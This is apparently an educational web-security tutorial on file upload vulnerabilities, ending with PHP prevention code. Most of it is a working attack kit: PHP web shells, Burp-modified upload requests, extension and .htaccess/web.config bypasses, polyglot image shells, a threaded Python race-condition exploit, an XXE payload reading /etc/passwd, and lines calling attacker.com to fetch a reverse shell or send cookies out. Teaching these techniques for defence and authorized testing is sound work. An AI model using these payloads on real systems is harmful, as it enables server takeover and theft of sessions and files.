# File upload vulnerabilities

File upload vulnerabilities occur when web applications allow users to upload files without properly validating their name, type, content, or size. While file upload functionality is ubiquitous—profile pictures, document sharing, attachments—improper implementation can enable attackers to upload malicious files, particularly web shells, leading to complete server compromise. The severity ranges from stored XSS through uploaded HTML to full remote code execution via uploaded PHP, JSP, or ASP scripts.

The challenge with file upload security is that validation must be comprehensive—checking file extension, MIME type, content, size, and filename—while any single oversight can be exploited for devastating attacks.

> Only test systems you own or are explicitly authorized to assess.

## What are file upload vulnerabilities? (fundamentals)

### The basic concept

**Normal file upload flow:**
```
1. User selects file (profile.jpg)
2. Browser sends file to server
3. Server validates file
4. Server stores file safely
5. File served when requested (as image)
```

**Vulnerable flow:**
```
1. User selects malicious file (shell.php disguised as image)
2. Browser sends file to server
3. Server performs weak/no validation ✗
4. Server stores file in web-accessible directory ✗
5. Attacker requests file → Server executes PHP code → RCE
```

### How servers handle static files

**Extension to MIME type mapping:**
```
Server sees: profile.jpg
Determines: MIME type = image/jpeg
Action: Send file contents as image

Server sees: script.php
Determines: MIME type = application/x-httpd-php
Action: Execute PHP code, return output
```

**The vulnerability:** If attacker uploads `shell.php`:
```
1. File stored at: /var/www/uploads/shell.php
2. Attacker requests: https://target.com/uploads/shell.php
3. Server sees .php extension
4. Server executes file as PHP code
5. Result: Remote Code Execution
```

### Web shells (the ultimate goal)

**Simple web shell:**
```php
<?php system($_GET['cmd']); ?>
```

**Usage after upload:**
```
https://target.com/uploads/shell.php?cmd=whoami
Response: www-data

https://target.com/uploads/shell.php?cmd=cat /etc/passwd
Response: root:x:0:0:root:/root:/bin/bash...

https://target.com/uploads/shell.php?cmd=ls -la
Response: (directory listing)
```

**More sophisticated web shell:**
```php
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo "<pre>";
    echo shell_exec($cmd);
    echo "</pre>";
    die;
}
?>

<!-- Web-based interface -->
<html>
<body>
<form method="post">
    Command: <input type="text" name="cmd" size="50">
    <input type="submit" value="Execute">
</form>
</body>
</html>
```

### Impact levels

**Critical - Remote Code Execution:**
- Upload and execute web shell
- Full server control
- Read/write any file
- Access databases
- Pivot to internal network
- Install persistent backdoors

**High - Sensitive file overwrite:**
- Overwrite critical files (.htaccess, web.config)
- Replace legitimate scripts with malicious ones
- Denial of service (overwrite index.php)

**Medium - Client-side attacks:**
- Stored XSS via uploaded HTML/SVG
- Phishing via hosted malicious files
- Malware distribution

**Low - Denial of Service:**
- Fill disk space with large files
- Resource exhaustion

## Unrestricted file upload (no validation)

### Vulnerability: No restrictions at all

**Vulnerable code:**
```php
<?php
if(isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $filename = $file['name'];
    $destination = '/var/www/uploads/' . $filename;
    
    // No validation whatsoever!
    move_uploaded_file($file['tmp_name'], $destination);
    
    echo "File uploaded: /uploads/$filename";
}
?>
```

**Exploitation:**

**Step 1: Create web shell**
```php
// shell.php
<?php system($_GET['cmd']); ?>
```

**Step 2: Upload via legitimate form**
```html
<form action="/upload" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
```

**Step 3: Access uploaded shell**
```
https://target.com/uploads/shell.php?cmd=whoami
Response: www-data

https://target.com/uploads/shell.php?cmd=cat /etc/passwd
Response: (password file contents)
```

**Step 4: Establish persistent access**
```
# Download reverse shell
?cmd=wget http://attacker.com/reverse.sh -O /tmp/r.sh

# Make executable
?cmd=chmod +x /tmp/r.sh

# Execute
?cmd=/tmp/r.sh
```

## Bypassing Content-Type validation

### Vulnerability: Trusting client-supplied MIME type

**Vulnerable validation:**
```php
<?php
if(isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $contentType = $file['type'];  // From client!
    
    // Only checks MIME type
    $allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    if(!in_array($contentType, $allowedTypes)) {
        die("Only images allowed!");
    }
    
    $filename = $file['name'];
    move_uploaded_file($file['tmp_name'], "/var/www/uploads/$filename");
    echo "Uploaded: /uploads/$filename";
}
?>
```

**Understanding multipart/form-data:**

**Normal image upload request:**
```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="profile.jpg"
Content-Type: image/jpeg

[JPEG binary data]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

**Exploitation with Burp Suite:**

**Step 1: Upload legitimate image to capture request**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

<JPEG data>
------WebKitFormBoundary--
```

**Step 2: Intercept in Burp, modify:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**Key changes:**
- `filename="shell.php"` ← Changed extension
- `Content-Type: image/jpeg` ← Kept to bypass validation
- Content: PHP code instead of image

**Result:** Server sees `Content-Type: image/jpeg`, passes validation, saves as `shell.php`, executes when accessed.

## Bypassing path restrictions via directory traversal

### Vulnerability: Files restricted to upload directory but executable elsewhere

**Scenario:**
```
/var/www/uploads/     ← No PHP execution (configured)
/var/www/scripts/     ← PHP execution enabled
/var/www/html/        ← PHP execution enabled
```

**Vulnerable code:**
```php
<?php
$filename = $_FILES['file']['name'];
$destination = '/var/www/uploads/' . $filename;

// Extension check
if(!preg_match('/\.(jpg|png|gif)$/i', $filename)) {
    die("Only images allowed!");
}

move_uploaded_file($_FILES['file']['tmp_name'], $destination);
?>
```

**Exploitation using path traversal:**

**Step 1: Craft filename with directory traversal**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**Result:**
```
Destination: /var/www/uploads/../shell.php
Resolves to: /var/www/shell.php
```

**Now accessible at root level where PHP executes!**

**Alternative paths:**
```
filename="../../html/shell.php"
filename="../../../var/www/html/shell.php"
filename="..%2fshell.php"  (URL encoded)
filename="....//shell.php"  (nested traversal)
```

**If `.php` extension blocked, use image extension:**
```http
filename="../shell.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

**Then access via extension override (if .htaccess uploadable):**
```apache
# Upload .htaccess to /uploads/
AddType application/x-httpd-php .jpg
```

Now `shell.jpg` executes as PHP!

## Bypassing extension blacklists

### Vulnerability: Incomplete blacklist of dangerous extensions

**Vulnerable code:**
```php
<?php
$filename = $_FILES['file']['name'];
$extension = pathinfo($filename, PATHINFO_EXTENSION);

// Blacklist common dangerous extensions
$blacklist = ['php', 'exe', 'sh', 'bat'];
if(in_array(strtolower($extension), $blacklist)) {
    die("File type not allowed!");
}

move_uploaded_file($_FILES['file']['tmp_name'], "/var/www/uploads/$filename");
?>
```

### Bypass technique 1: Alternative PHP extensions

**Apache may execute:**
```
.php3
.php4
.php5
.php7
.phtml
.phar
.phps
```

**Exploitation:**
```http
POST /upload HTTP/1.1

filename="shell.php5"

<?php system($_GET['cmd']); ?>
```

If server configured to execute `.php5` files → RCE!

**Check Apache config for enabled extensions:**
```apache
# In apache2.conf or .htaccess
AddType application/x-httpd-php .php .php3 .php4 .php5 .phtml
```

### Bypass technique 2: Uploading .htaccess

**Upload custom Apache configuration:**

**File: .htaccess**
```apache
AddType application/x-httpd-php .jpg
```

**Exploitation workflow:**

**Step 1: Upload .htaccess**
```http
POST /upload HTTP/1.1

filename=".htaccess"

AddType application/x-httpd-php .jpg
```

**Step 2: Upload PHP code with .jpg extension**
```http
POST /upload HTTP/1.1

filename="shell.jpg"

<?php system($_GET['cmd']); ?>
```

**Step 3: Access shell**
```
https://target.com/uploads/shell.jpg?cmd=whoami
```

Now `.jpg` files in that directory execute as PHP!

### Bypass technique 3: Uploading web.config (IIS)

**For Windows/IIS servers:**

**File: web.config**
```xml
<configuration>
    <system.webServer>
        <staticContent>
            <mimeMap fileExtension=".jpg" mimeType="application/x-httpd-php" />
        </staticContent>
        <handlers>
            <add name="PHP_via_FastCGI" 
                 path="*.jpg" 
                 verb="*" 
                 modules="FastCgiModule" 
                 scriptProcessor="C:\PHP\php-cgi.exe" 
                 resourceType="Unspecified" />
        </handlers>
    </system.webServer>
</configuration>
```

**Or execute ASP code:**
```xml
<configuration>
    <system.webServer>
        <handlers>
            <add name="ASP_jpg" 
                 path="*.jpg" 
                 verb="*" 
                 type="ASP" />
        </handlers>
    </system.webServer>
</configuration>
```

## Obfuscating file extensions

### Technique 1: Case sensitivity bypass

**Vulnerable (case-sensitive blacklist):**
```php
$blacklist = ['php', 'exe', 'sh'];
$extension = pathinfo($filename, PATHINFO_EXTENSION);

if(in_array($extension, $blacklist)) {  // Case-sensitive!
    die("Blocked");
}
```

**Bypass:**
```
shell.PHP   (uppercase)
shell.PhP   (mixed case)
shell.pHp
```

If validation is case-sensitive but server execution is case-insensitive → bypass!

### Technique 2: Double extensions

**Exploiting parsing differences:**
```
shell.php.jpg
shell.jpg.php
shell.php.png
```

**Why it works:** Different components may parse differently:
- Validation checks: last extension = `.jpg` ✓
- Server executes: first extension = `.php` → RCE

**Apache precedence (right to left):**
```
shell.php.jpg → Processed as .jpg (safe)
```

**But with misconfiguration:**
```apache
AddHandler application/x-httpd-php .php
```

May process `shell.php.jpg` as PHP if it contains `.php` anywhere.

### Technique 3: Trailing characters

**Add whitespace, dots, or special chars:**
```
shell.php    (space)
shell.php.   (trailing dot)
shell.php..
shell.php%20
shell.php%0a (newline)
```

**Why it works:**
- Validation strips trailing chars: `shell.php.` → `shell.php` → blocked
- File system keeps them: `shell.php.` → stored as-is
- Server accesses without trailing char: `shell.php` → executes

**Or validation doesn't strip but filesystem does:**
```
Upload: shell.php.
Validation sees: shell.php. → passes (not in blacklist)
Windows filesystem saves as: shell.php (auto-strips trailing dot)
Result: shell.php saved and executable
```

### Technique 4: Null byte injection

**Historical vulnerability (PHP < 5.3.4):**
```
shell.php%00.jpg
shell.php\x00.jpg
```

**How it worked:**
- Validation sees: `shell.php%00.jpg` → `.jpg` extension → allowed
- C-based file system functions stop at null byte: `shell.php` → saved
- Result: `shell.php` stored and executable

**Modern exploitation (rare):**
```php
// Vulnerable code
$ext = substr($filename, strrpos($filename, '.'));
if(!in_array($ext, ['.jpg', '.png'])) die("Invalid");

move_uploaded_file($tmp, "/uploads/" . $filename);
```

**Attack:**
```
filename: shell.php%00.jpg

Validation: strrpos finds last '.' → .jpg → passes
File system: Stops at %00 → saves shell.php
```

### Technique 5: Nested extensions

**If filter removes dangerous extension:**
```php
$filename = str_replace('.php', '', $filename);
```

**Bypass with nesting:**
```
shell.p.phphp
```

**After filtering:**
```
shell.p.phphp
      ^^^^^ removed
shell.php ← Dangerous extension remains!
```

**Other nested patterns:**
```
shell..phphp
shell.p.phphp.jpg
exploit.php.php.php (multiple removals)
```

### Technique 6: URL encoding

**Encode dots or slashes:**
```
shell%2ephp     (. encoded)
shell%252ephp   (double encoded)
shell.ph%70     (p encoded)
```

**If validation doesn't decode but filesystem does:**
```
Validation sees: shell%2ephp → doesn't recognize .php → allows
Filesystem decodes: shell.php → saves
Result: RCE
```

### Technique 7: Unicode/multibyte characters

**Use Unicode sequences that normalize to dangerous chars:**
```
shell.php (where . is Unicode lookalike)
shell.php (where p is Cyrillic 'р')
shell.phpẋ (where ẋ normalizes to nothing)
```

**Or sequences that convert to null bytes:**
```
xC0x2E → Becomes . after conversion
xC0xAE → Becomes . after conversion
```

## Bypassing content validation

### Vulnerability: Checking magic bytes/file signatures

**Common file signatures:**
```
JPEG: FF D8 FF E0 / FF D8 FF E1
PNG:  89 50 4E 47 0D 0A 1A 0A
GIF:  47 49 46 38 39 61  (GIF89a)
PDF:  25 50 44 46  (%PDF)
```

**Vulnerable validation:**
```php
<?php
function isValidImage($file) {
    $header = file_get_contents($file, false, null, 0, 4);
    
    // Check JPEG signature
    if(bin2hex($header) == 'ffd8ffe0') {
        return true;
    }
    
    return false;
}

if(!isValidImage($_FILES['file']['tmp_name'])) {
    die("Not a valid image!");
}

move_uploaded_file($_FILES['file']['tmp_name'], "/uploads/" . $_FILES['file']['name']);
?>
```

### Bypass: Polyglot files (valid image + web shell)

**Create hybrid JPEG + PHP:**

**Method 1: Prepend JPEG signature to PHP**
```bash
# Create valid JPEG header
echo -ne '\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46' > shell.php

# Append PHP code
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

**Method 2: Use ExifTool to embed PHP in image metadata**
```bash
# Start with legitimate image
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php

# Or in Description field
exiftool -Description='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
```

**Method 3: Manual hex editing**
```bash
# 1. Get valid JPEG
# 2. Open in hex editor
# 3. Locate EXIF comment section
# 4. Insert: <?php system($_GET["cmd"]); ?>
# 5. Save as shell.php
```

**The file now:**
- Has valid JPEG signature → passes content validation ✓
- Contains PHP code in metadata
- If saved as `.php` and accessed → PHP executes

**Accessing the polyglot:**
```
https://target.com/uploads/shell.php?cmd=whoami

Response: (image data + command output mixed)
```

### Advanced polyglot creation

**Using GIF + PHP:**
```php
GIF89a; <?php system($_GET['cmd']); ?>
```

**Why it works:**
- `GIF89a` = Valid GIF signature
- `;` = Comment in GIF format
- PHP code after comment
- Passes GIF validation + executes as PHP

**Using PNG + PHP:**
```bash
# Create polyglot PNG
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system($_GET["cmd"]); ?>' > shell.php
```

## Race condition exploitation

### Vulnerability: File uploaded before validation completes

**Vulnerable code flow:**
```php
<?php
// Step 1: Upload file
$temp_name = $_FILES['file']['tmp_name'];
$filename = $_FILES['file']['name'];
$destination = "/var/www/uploads/$filename";

move_uploaded_file($temp_name, $destination);

// Step 2: Scan for malware (takes time)
sleep(2);  // Simulates virus scan
$scan_result = scan_file($destination);

// Step 3: Delete if malicious
if($scan_result == 'malicious') {
    unlink($destination);
    die("Malicious file detected!");
}

echo "File uploaded successfully!";
?>
```

**The window of vulnerability:**
```
Time 0ms:    File uploaded to /uploads/shell.php
Time 0-2000ms: File exists and accessible!
Time 2000ms: Scan completes
Time 2001ms: File deleted (if malicious)
```

### Exploitation technique

**Goal:** Execute the file before it's deleted.

**Attack script:**
```python
import requests
import threading
import time

target = "https://target.com"
upload_url = f"{target}/upload"
shell_url = f"{target}/uploads/shell.php?cmd=whoami"

def upload_shell():
    """Upload malicious file repeatedly"""
    while True:
        files = {
            'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')
        }
        requests.post(upload_url, files=files)
        time.sleep(0.1)

def access_shell():
    """Try to access shell before deletion"""
    while True:
        try:
            response = requests.get(shell_url, timeout=1)
            if response.status_code == 200:
                print(f"[+] Success! Output: {response.text}")
                if "www-data" in response.text:
                    print("[+] RCE achieved!")
                    return
        except:
            pass

# Start multiple threads
for _ in range(10):
    threading.Thread(target=upload_shell, daemon=True).start()
    threading.Thread(target=access_shell, daemon=True).start()

time.sleep(30)  # Run for 30 seconds
```

**Success indicators:**
- Hundreds of upload attempts
- Simultaneous access attempts
- Eventually hits the timing window
- Gets command output before deletion

### Improving success rate

**Technique 1: Slow upload (extend window)**
```python
# Upload very large file to extend processing time
large_file = b"<?php system($_GET['cmd']); ?>" + (b"A" * 10000000)  # 10MB

files = {'file': ('shell.php', large_file, 'image/jpeg')}
```

**Technique 2: Persistent shell**
```php
// shell.php - writes another shell immediately
<?php
file_put_contents('../persistent.php', '<?php system($_GET["cmd"]); ?>');
system($_GET['cmd']);
?>
```

Even if `shell.php` deleted, `persistent.php` remains!

**Technique 3: Trigger via include**
```php
// Upload this as shell.php
<?php
include('/path/to/script/that/includes/uploads/files.php');
system($_GET['cmd']);
?>
```

## Client-side attacks via file upload

### Stored XSS via HTML upload

**If application serves uploaded files without proper headers:**

**Upload malicious HTML:**
```html
<!-- xss.html -->
<html>
<body>
<script>
    // Steal cookies
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
    
    // Redirect to phishing
    window.location = 'https://attacker.com/phishing';
</script>
</body>
</html>
```

**Access:**
```
https://target.com/uploads/xss.html
```

**If same-origin:** Executes JavaScript in context of target.com → steal cookies, hijack sessions.

### Stored XSS via SVG upload

**SVG files support embedded JavaScript:**

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);"/>
   <script type="text/javascript">
      alert("XSS via SVG");
      fetch('https://attacker.com/steal?cookie=' + document.cookie);
   </script>
</svg>
```

**Why it works:**
- Valid SVG file (passes validation)
- Contains JavaScript
- Browser executes when rendering

### XXE via uploaded XML files

**If application processes uploaded XML:**

```xml
<!-- xxe.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
```

**Or external DTD:**
```xml
<!DOCTYPE foo [
   <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
   %xxe;
]>
```

**Result:** Read local files, SSRF, etc.

## Prevention strategies

### 1) Whitelist allowed extensions

**Bad - Blacklist:**
```php
$blacklist = ['php', 'exe', 'sh'];
if(in_array($extension, $blacklist)) die("Blocked");
```

**Good - Whitelist:**
```php
$whitelist = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
$extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

if(!in_array($extension, $whitelist)) {
    die("Only images and PDFs allowed");
}
```

### 2) Validate file content (magic bytes)

```php
function validateImageContent($file) {
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $file);
    finfo_close($finfo);
    
    $allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];
    
    if(!in_array($mimeType, $allowedMimes)) {
        return false;
    }
    
    // Additional check: Verify image can be processed
    $imageInfo = getimagesize($file);
    if($imageInfo === false) {
        return false;  // Not a valid image
    }
    
    return true;
}
```

### 3) Rename uploaded files

```php
// Never use user-supplied filename
$extension = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
$newFilename = uniqid('', true) . '.' . $extension;
$destination = "/var/www/uploads/$newFilename";

move_uploaded_file($_FILES['file']['tmp_name'], $destination);
```

### 4) Store files outside web root

```php
// Upload to non-web-accessible directory
$uploadDir = '/var/file_storage/uploads/';  // Outside /var/www/

// Serve via script that checks permissions
@app.route('/download/<file_id>')
def download_file(file_id):
    if not user_has_permission(current_user, file_id):
        abort(403)
    
    file_path = f'/var/file_storage/uploads/{file_id}'
    return send_file(file_path, as_attachment=True)
```

### 5) Configure server to not execute uploads

**Apache - Disable PHP in uploads directory:**
```apache
# /var/www/uploads/.htaccess
<FilesMatch "\.ph(p[3-7]?|tml)$">
    SetHandler none
    ForceType text/plain
</FilesMatch>

# Or completely disable all handlers
RemoveHandler .php .php3 .php4 .php5 .phtml
```

**Nginx:**
```nginx
location /uploads/ {
    # Disable PHP execution
    location ~ \.php$ {
        deny all;
    }
}
```

### 6) Use Content-Disposition header

```php
// Force download instead of execution
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . $filename . '"');
readfile($filepath);
```

### 7) Implement comprehensive validation

```php
function secureFileUpload($file) {
    // 1. Check file was uploaded via HTTP POST
    if(!is_uploaded_file($file['tmp_name'])) {
        return ['error' => 'Invalid upload'];
    }
    
    // 2. Check file size
    $maxSize = 5 * 1024 * 1024;  // 5MB
    if($file['size'] > $maxSize) {
        return ['error' => 'File too large'];
    }
    
    // 3. Validate extension (whitelist)
    $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
    if(!in_array($extension, $allowedExtensions)) {
        return ['error' => 'Invalid file type'];
    }
    
    // 4. Validate MIME type
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $file['tmp_name']);
    finfo_close($finfo);
    
    $allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];
    if(!in_array($mimeType, $allowedMimes)) {
        return ['error' => 'Invalid MIME type'];
    }
    
    // 5. Validate actual image
    $imageInfo = getimagesize($file['tmp_name']);
    if($imageInfo === false) {
        return ['error' => 'Not a valid image'];
    }
    
    // 6. Strip any path components from filename
    $basename = basename($file['name']);
    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '', $basename);
    
    // 7. Generate unique filename
    $newFilename = uniqid() . '_' . time() . '.' . $extension;
    
    // 8. Move to safe location (outside web root)
    $uploadDir = '/var/secure_storage/uploads/';
    $destination = $uploadDir . $newFilename;
    
    if(!move_uploaded_file($file['tmp_name'], $destination)) {
        return ['error' => 'Upload failed'];
    }
    
    // 9. Set restrictive permissions
    chmod($destination, 0644);
    
    return ['success' => true, 'filename' => $newFilename];
}
```
